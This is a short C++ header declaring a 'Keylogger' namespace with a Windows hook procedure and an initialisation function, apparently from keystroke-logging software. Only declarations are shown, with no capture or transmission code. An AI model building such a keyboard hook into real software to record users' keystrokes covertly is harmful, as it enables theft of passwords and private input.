#pragma once

#include "Includes.h"

namespace Keylogger {
    LRESULT HookProc(int code, WPARAM wParam, LPARAM lParam);
    int Init();
}